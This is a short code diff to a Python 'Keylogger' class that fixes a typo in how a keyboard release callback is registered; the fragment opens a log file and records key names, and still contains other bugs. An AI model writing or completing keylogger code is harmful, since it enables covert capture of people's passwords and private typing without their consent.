@@ -3,7 +3,7 @@ class Keylogger():
     def __innit__(self, log_filename):
         self.f = open(log_filename,"w")
     def start_log(self):
-        keyboard.on_release(callback=nself.callback)    
+        keyboard.on_release(callback = self.callback)    
         keyboard.wait()
     def new_key(event):
         button = event.name
